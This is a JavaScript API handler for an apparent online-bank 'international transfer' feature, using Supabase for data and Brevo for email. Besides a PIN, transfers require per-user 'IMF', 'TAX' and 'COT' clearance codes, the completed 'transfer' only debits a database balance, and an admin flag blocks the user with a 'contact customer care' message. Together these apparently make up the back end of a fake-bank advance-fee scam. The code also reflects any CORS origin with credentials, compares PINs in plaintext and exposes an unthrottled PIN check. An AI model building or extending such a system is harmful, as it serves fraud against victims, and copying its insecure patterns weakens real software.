import { createClient } from "@supabase/supabase-js";
import { BrevoClient } from "@getbrevo/brevo";
import jwt from "jsonwebtoken";
import ws from "ws";
import { generateInternationalAlertTemplate } from "./international-template.js";

const SUPABASE_URL = process.env.PUBLIC_SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const JWT_SECRET = process.env.JWT_SECRET;

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, {
  auth: { persistSession: false },
  realtime: { transport: ws }
});

function formatPlatformName(signature) {
  if (!signature || typeof signature !== "string") return "Platform";
  const cleanStr = signature.trim();
  return cleanStr.charAt(0).toUpperCase() + cleanStr.slice(1);
}

async function getAdminEmailConfig(signature) {
  const { data: adminRecord, error } = await supabase
    .from("admin_2")
    .select("api, domain_email, contact_email, email")
    .eq("signature", signature)
    .maybeSingle();

  if (error || !adminRecord) {
    throw new Error(error ? error.message : `Failed to fetch email settings from admin_2 for signature: "${signature}"`);
  }

  if (!adminRecord.api?.trim()) {
    throw new Error("Missing Brevo API key in admin_2 configuration.");
  }

  const senderEmail = (adminRecord.domain_email || adminRecord.contact_email)?.trim();
  if (!senderEmail) {
    throw new Error("Neither domain_email nor contact_email is configured in admin_2 table.");
  }

  return {
    apiKey: adminRecord.api.trim(),
    senderEmail: senderEmail
  };
}

export default async function handler(req, res) {
  const requestOrigin = req.headers.origin;
  if (requestOrigin) {
    res.setHeader("Access-Control-Allow-Origin", requestOrigin);
  }

  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Accept, X-Action, X-Action-Phase, X-Transaction-Pin, X-User-UUID, X-Setting-Target, x-setting-target");
  res.setHeader("Access-Control-Allow-Credentials", "true");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false, error: "Method blocked." });
  }

  try {
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith("Bearer ")) {
      return res.status(401).json({ success: false, error: "Authentication credentials missing." });
    }

    const token = authHeader.split(" ")[1];
    let decodedToken;
    try {
      decodedToken = jwt.verify(token, JWT_SECRET);
    } catch (jwtErr) {
      return res.status(401).json({ success: false, error: "Session validation token expired." });
    }

    const { data: userData, error: userError } = await supabase
      .from("users")
      .select("*")
      .eq("uuid", decodedToken.uuid)
      .maybeSingle();

    if (userError || !userData) {
      return res.status(444).json({ success: false, error: "Operator identity mapping failure." });
    }

    if (userData.block_transection === true || userData.block_transection === "true") {
      return res.status(403).json({
        success: false,
        error: "can't make any transfer at the moment please contact or chat customer-care server"
      });
    }

    const actionPhase = req.headers['x-action-phase'];

    if (actionPhase === 'lock-account') {
      await supabase.from("users").update({ block_transection: true }).eq("id", userData.id);
      return res.status(200).json({ success: true, message: "Security boundaries triggered. Account restricted." });
    }

    if (actionPhase === 'pre-check') {
      const { amount } = req.body;
      const requestedAmount = parseFloat(amount || "0");

      if (!requestedAmount || requestedAmount <= 0) {
        return res.status(400).json({ success: false, error: "Invalid operational transaction amount bounds." });
      }

      const userAvailableBalance = parseFloat(userData.accountBalance || "0");
      if (userAvailableBalance < requestedAmount) {
        return res.status(400).json({ success: false, error: "Liquidity clearance exception: Insufficient balance assets." });
      }

      return res.status(200).json({
        success: true,
        transferAccess: userData.transferAccess === true || userData.transferAccess === "true"
      });
    }

    if (actionPhase === 'verify-pin') {
      const userProvidedPin = req.body.pin ? String(req.body.pin).trim() : "";
      const databaseStoredPin = userData.pin ? String(userData.pin).trim() : "";
      return res.status(200).json({ success: userProvidedPin === databaseStoredPin });
    }

    if (actionPhase === 'verify-imf') {
      const userProvidedCode = req.body.code ? String(req.body.code).trim() : "";
      const databaseStoredCode = (userData.IMF || userData.imf) ? String(userData.IMF || userData.imf).trim() : "";
      return res.status(200).json({ success: userProvidedCode === databaseStoredCode && databaseStoredCode !== "" });
    }

    if (actionPhase === 'verify-tax') {
      const userProvidedCode = req.body.code ? String(req.body.code).trim() : "";
      const databaseStoredCode = (userData.TAX || userData.tax) ? String(userData.TAX || userData.tax).trim() : "";
      return res.status(200).json({ success: userProvidedCode === databaseStoredCode && databaseStoredCode !== "" });
    }

    if (actionPhase === 'verify-cot') {
      const userProvidedCode = req.body.code ? String(req.body.code).trim() : "";
      const databaseStoredCode = (userData.COT || userData.cot) ? String(userData.COT || userData.cot).trim() : "";
      return res.status(200).json({ success: userProvidedCode === databaseStoredCode && databaseStoredCode !== "" });
    }

    if (actionPhase === 'commit-transfer') {
      const clientSecuredPin = req.headers['x-transaction-pin'];
      if (!clientSecuredPin || clientSecuredPin !== userData.pin) {
        return res.status(401).json({ success: false, error: "Operational transaction clearance denied: Invalid Security PIN." });
      }

      const { amount, fullname, accountnumber, bankname, des } = req.body;
      const parsedAmount = parseFloat(amount);

      const currentBalance = parseFloat(userData.accountBalance || "0");
      if (currentBalance < parsedAmount) {
        return res.status(400).json({ success: false, error: "Balance liquidity exception validation fault." });
      }

      const updateBalanceValue = (currentBalance - parsedAmount).toString();

      const { error: deductErr } = await supabase
        .from("users")
        .update({ accountBalance: updateBalanceValue })
        .eq("id", userData.id);

      if (deductErr) throw new Error("Processing ledger debit structural rejection exception.");

      const timestampString = new Date().toLocaleDateString('en-US', { day: 'numeric', month: 'short', year: 'numeric' });

      await supabase.from("history").insert([
        {
          amount: `-${parsedAmount}`,
          date: timestampString,
          description: des || `Cross-Border SWIFT Wire: ${bankname}`,
          transactionType: "Debit",
          uuid: userData.uuid,
          name: fullname || `Beneficiary: ${accountnumber}`,
          signature: userData.signature
        }
      ]);

      // Brevo Transactional Email Pipeline
      try {
        const { apiKey, senderEmail } = await getAdminEmailConfig(userData.signature);
        const brevo = new BrevoClient({ apiKey });
        const platformName = formatPlatformName(userData.signature);
        const recipientDisplayName = `${fullname}${bankname ? ` (${bankname})` : ''}`;
        const tokenVal = Math.floor(100000 + Math.random() * 900000);

        const htmlContent = generateInternationalAlertTemplate(
          platformName,
          userData,
          recipientDisplayName,
          updateBalanceValue,
          parsedAmount,
          des,
          timestampString
        );

        brevo.transactionalEmails.sendTransacEmail({
          sender: { name: platformName, email: senderEmail },
          to: [{ email: userData.email.trim() }],
          subject: `${platformName} New Transaction`,
          htmlContent: htmlContent
        }).then(() => {
          console.log("📨 Baseline international email sent via Brevo.");
        }).catch((err) => {
          console.warn("⚠️ Background Brevo delivery pipeline fault trace:", err.message);
        });

      } catch (brevoPipeError) {
        console.warn("⚠️ Ledger entry committed but Brevo notification engine caught an anomaly:", brevoPipeError.message);
      }

      return res.status(200).json({ success: true, message: "Cross-border transaction execution finalized." });
    }

  } catch (globalExecutionError) {
    console.error("❌ International handler root loop error:", globalExecutionError);
    return res.status(500).json({ success: false, error: globalExecutionError.message });
  }
}